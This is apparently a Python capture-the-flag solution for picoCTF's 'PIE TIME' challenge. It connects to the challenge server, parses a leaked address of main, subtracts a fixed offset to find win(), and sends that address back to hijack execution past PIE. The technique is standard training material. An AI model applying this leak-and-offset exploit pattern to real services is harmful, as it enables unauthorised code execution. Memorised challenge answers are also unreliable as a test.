#!/usr/bin/env python3
"""PIE TIME - picoCTF
Leaked main address + known offsets = win() address."""

import socket
import re

HOST = "rescued-float.picoctf.net"
PORT = 55413
DELTA = 0x133d - 0x12a7  # 0x96

s = socket.socket()
s.settimeout(10)
s.connect((HOST, PORT))

data = s.recv(4096).decode()
print("RECV:", data)

# Parse main address
m = re.search(r"Address of main: (0x[0-9a-f]+)", data)
main_addr = int(m.group(1), 16)
win_addr = main_addr - DELTA
print(f"main @ {hex(main_addr)}, win @ {hex(win_addr)}")

# Send win address (without 0x prefix)
s.sendall(hex(win_addr)[2:].encode() + b"\n")

# Read response
resp = b""
while True:
    try:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    except:
        break

print(resp.decode(errors='replace'))
s.close()
